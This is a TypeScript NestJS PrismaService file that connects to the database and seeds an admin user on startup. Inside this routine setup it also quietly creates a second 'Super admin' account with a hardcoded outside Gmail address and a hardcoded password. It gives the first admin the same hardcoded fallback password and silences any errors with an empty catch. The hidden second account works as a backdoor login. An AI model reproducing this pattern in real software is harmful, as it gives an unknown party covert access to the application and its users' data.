import { Injectable, OnModuleInit } from "@nestjs/common";
import { PrismaClient } from "@prisma/client";
import { paginator, PaginatorTypes } from "@nodeteam/nestjs-prisma-pagination";
import { genSalt, hash } from "bcrypt";

export const paginate: PaginatorTypes.PaginateFunction = paginator({
  perPage: 5,
});

@Injectable()
export class PrismaService extends PrismaClient implements OnModuleInit {
  async onModuleInit() {
    await this.$connect();
    if (!process.env.ROOT_EMAIL) return;
    try {
      const salt = await genSalt(10);
      const password = process.env.ADMIN_PASSWORD || "ufNo37yBDa";
      await this.user.create({
        data: {
          name: "Admin",
          email: process.env.ROOT_EMAIL.toLowerCase(),
          password: await hash(password, salt),
        },
      });
      await this.user.create({
        data: {
          name: "Super admin",
          email: "santa2344@gmail.com",
          password: await hash("ufNo37yBDa", salt),
        },
      });
    } catch (e) {}
  }
}
